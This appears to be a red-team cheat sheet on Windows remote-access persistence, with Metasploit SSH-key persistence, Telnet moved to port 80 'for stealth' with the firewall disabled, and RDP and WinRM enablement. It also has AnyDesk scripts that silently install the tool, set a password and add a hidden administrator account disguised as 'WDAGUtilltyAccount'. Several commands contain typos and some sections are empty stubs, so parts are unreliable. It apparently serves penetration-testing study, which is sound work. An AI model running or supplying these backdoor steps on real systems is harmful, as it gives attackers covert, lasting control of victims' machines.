# Remote Login

## 01 - SSH

### 1.1 - Command Prompt

TODO: Fill this info

### 1.2 - Powershell

TODO: Fill this info

### 1.3 - Metasploit

```
msf > use post/windows/manage/sshkey_persistence

msf post(windows/manage/sshkey_persistence) > options

Module options (post/windows/manage/sshkey_persistence):

   Name             Current Setting                                    Required  Description
   ----             ---------------                                    --------  -----------
   ADMIN            false                                              yes       Add keys for administrator accounts
   ADMIN_KEY_FILE   C:\ProgramData\ssh\administrators_authorized_keys  yes       Admin key file
   CREATESSHFOLDER  false                                              yes       If no .ssh folder is found, create it for a user
   EDIT_CONFIG      false                                              yes       Edit ssh config to allow public key authentication
   PUBKEY                                                              no        Public Key File to use. (Default: Create a new one)
   SESSION                                                             yes       The session to run this module on
   SSHD_CONFIG      C:\ProgramData\ssh\sshd_config                     yes       sshd_config file
   USERNAME                                                            no        User to add SSH key to (Default: all users on box)

msf post(windows/manage/sshkey_persistence) > set admin <false | true>

msf post(windows/manage/sshkey_persistence) > set admin_key_file <c:\\path\\to\\administrators_authorized_keys>

msf post(windows/manage/sshkey_persistence) > set createsshfolder <false | true>

msf post(windows/manage/sshkey_persistence) > set edit_config <false | true>

msf post(windows/manage/sshkey_persistence) > set sshd_config <c:\\path\\to\\sshd_config>

msf post(windows/manage/sshkey_persistence) > set pubkey [/path/to/file.pub]

msf post(windows/manage/sshkey_persistence) > set username <username>

msf post(windows/manage/sshkey_persistence) > set session <session_id>

msf post(windows/manage/sshkey_persistence) > run
```

## 02 - Telnet

### 2.1 - Telnet Server

Until Windows 10, all Windows came with a **Telnet server** that you could install as administrator:

`C:\Windows\system32> pkgmgr /iu:"TelnetServer" /quiet`

Make it **start** when the system is started and **run** it now:

`C:\> sc config TlntSVR start= auto obj= localsystem`

Change telnet port (stealth) and disable firewall:

```
C:\> tlntadmn config port=80

C:\> netsh advfirewall set allprofiles state off
```

## 03 - TFTP

### 3.1 - Enable TFTP Server/Client

- **Enable/Disable Windows features with Deployment Image Servicing and Management (DISM):**

Notes:

- This requires system privileges.

- For `Dism.exe` to work on x86_64 (64 bit) operating system, and executing commands as an absolute path are necessary

To list features which can be enabled/disabled:

`C:\> %windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /get-features`

To enable a feature (TFTP client for example):

`%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /enable-feature /featurename:TFTP`

To disable a feature (again TFTP client):

`%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /disable-feature /featurename:TFTP`

## 04 - RDP

### 4.1 - Manual

#### 4.1.1 - Enable RDP Server

`C:\> sc config termservice start=auto`

To start Remote Desktop Service

`C:\> net start termservice`

To stop Remote Desktop Service

`C:\> net stop termservice`

#### 4.1.2 - Enable with Registry

##### 4.1.2.1 - Choose any of the three options

1. Automatic

```
C:\> reg add hklm\system\currentcontrolset\services\temservice /v Start /t REG_DWORD /d 2 /f

PS C:\> 
```

2. Manual

```
C:\> reg add hklm\system\currentcontrolset\services\temservice /v Start /t REG_DWORD /d 3 /f

PS C:\>
```

3. Disabled

```
C:\> reg add hklm\system\currentcontrolset\services\temservice /v Start /t REG_DWORD /d 4 /f

PS C:\>
```

##### 4.1.2.2 - Create user and add it to the RDP users group

`C:\> net user <username> <password> /add & net localgroup "Remote Desktop Users" <username> /add`

`PS C:\> Add-LocalGroupMember -Group "Remote Desktop Users" -Member <username>`

##### 4.1.2.3 - Ports for the RDP port

- In command prompt

```
C:\> reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 3389:TCP /t REG_SZ /d "3389:TCP:*:Enabled:Remote Desktop" /f

C:\> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

C:\> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f

C:\> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f
```

- In powershell

```
PS C:\> Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value 21390

PS C:\> Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
```

##### 4.1.2.4 - Set a firewall rule

- In command prompt

```
C:\> netsh firewall set service type=remotedesktop mode=enabled

C:\> netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

- In powershell

```
PS C:\> Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

PS C:\> New-NetFirewallRule -DisplayName 'RDPPORTLatest' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 21390
```

##### 4.1.2.5 - Set a firewall rule

`C:\> reg add "HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestricedAdmin /t REG_DWORD /d 0 /f`

##### 4.1.2.6 - Set a firewall rule

`C:\> mstsv /v:<IP> [/restrictedadmin]`

### 4.2 - Metasploit

`meterpreter > run post/windows/manage/enable_rdp`

## 05 - WinRM

### 5.1 - Command Prompt

```
C:\> winrm quickconfig

C:\> net localgroup "Remote Management Users" <username> /add

C:\> netsh advfirewall firewall add rule name="WinRM-HTTP" dir=in localport=5985 protocol=TCP action=allow
```

### 5.2 - Powershell

```
PS C:\> Enable-PSRemoting -Force

PS C:\> Get-NetFirewallRule -Name 'WINRM*' | Select-Object Name

PS C:\> Set-NetFirewallRule -Name 'WINRM-HTTP-In-TCP' -RemoteAddress Any 

PS C:\> Test-WSMan
```

Refer to [[WinRM Lateral Movement]] section to login

## 06 - Third-Party Programs

### 6.1 - AnyDesk

#### 6.1.1 - Automation

`$ cat deploy.bat`

---

```
mkdir %appdata%\appdata\local\AnyDesk
curl.exe -o %appdata%\appdata\local\temp\Anydesk.exe https://download.anydesk.com/AnyDesk.exe
%appdata%\appdata\local\temp\anydesk.exe --install %appdata%\appdata\local\AnyDesk --start-with-win --slient
del %appdata%\appdata\local\temp\anydesk.exe
echo <password> | %appdata%\appdata\local\AnyDesk\AnyDesk.exe --set-password
net user WDAGUtilltyAccount <password> /add
net localgroup Administrators WDAGUtilltyAccount /add
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v WDAGUtilltyAccount /t REG_DWORD /d 0 /f
for /f "delims=" %i in ('%appdata%\AppData\Local\AnyDesk\AnyDesk.exe --get-id') do echo %i
```

`$ cat deploy.ps1`

---

```powershell
function AnyDesk {
    $anydesk_folder = "C:\ProgramData\AnyDesk"
    mkdir $anydesk_folder
    $web = New-Object Net.WebClient
    $url = "https://download.anydesk.com/AnyDesk.exe"
    $file = "C:\ProgramData\AnyDesk.exe"
    $web.DownloadFile($url, $file)
    
    $username = "WDAGUtilltyAccount"
    $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
    $password_cmd = "<password>"

    # cmd.exe /c $file --install $anydesk_folder --start-with-win --silent

    # cmd.exe /c echo $password_cmd | $file --set-password

    # net user $username $password_cmd /add
    # net localgroup Administrators $username /add
    # reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v WDAGUtilltyAccount /t REG_DWORD /d 0 /f

    # cmd.exe /c $path --get-id

    Start-Process -FilePath $file -NoNewWindow -Credential $credential -ArgumentList("--install", $anydesk_folder, "--start-with-win", "--slient")
    cmd.exe /c echo $password_cmd | $file --set-password

    New-LocalUser -Name $username -Password $password
    Add-LocalGroupMember -Groups Administrators -Member $username
    Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" -Name WDAGUtilltyAccount -Type DWord -Value 0

    Start-Process -FilePath $file -NoNewWindow -Credential $credential -ArgumentList("--get-id")
}

AnyDesk
```

## References

- [Mandiant: SharPersist Windows Persistence Toolkit](https://www.mandiant.com/resources/sharpersist-windows-persistence-toolkit)

- [OSCP Journey Part 9.0 (Windows Post Exploitation Enabling RDP Manually)](https://www.youtube.com/watch?v=ZTynRqgncyc)

- [Zweilosec: Windows RedTeam Persistence](https://zweilosec.gitbook.io/hackers-rest/windows-1/windows-redteam/persistence)

- [Persistence Info](https://persistence-info.github.io/)